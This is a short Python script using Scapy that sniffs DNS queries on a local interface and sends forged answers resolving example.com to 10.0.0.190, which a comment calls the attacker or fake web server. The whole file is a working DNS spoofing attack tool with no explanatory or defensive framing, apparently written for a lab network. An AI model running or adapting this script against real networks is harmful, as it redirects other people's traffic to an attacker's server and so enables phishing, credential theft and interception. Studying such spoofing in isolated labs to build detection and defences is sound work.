from scapy.all import *
import netifaces

# Configuration


FAKE_DOMAIN = b"example.com."
FAKE_IP     = "10.0.0.190"     # Attacker or fake web server
INTERFACE   = "ens33"          # Attacker interface

# DNS Spoofing Function

def spoof_dns(packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        qname = packet[DNS].qd.qname

        if FAKE_DOMAIN in qname:
            print(f"[+] Spoofing DNS for {qname.decode()}")

            spoofed_pkt = (
                IP(dst=packet[IP].src, src=packet[IP].dst) /
                UDP(dport=packet[UDP].sport, sport=53) /
                DNS(
                    id=packet[DNS].id,
                    qr=1,      # response
                    aa=1,
                    qd=packet[DNS].qd,
                    an=DNSRR(
                        rrname=qname,
                        ttl=10,
                        rdata=FAKE_IP
                    )
                )
            )

            send(spoofed_pkt, verbose=False)

# Start Sniffing

print("[*] DNS spoofing started")
sniff(filter="udp port 53", iface=INTERFACE, prn=spoof_dns)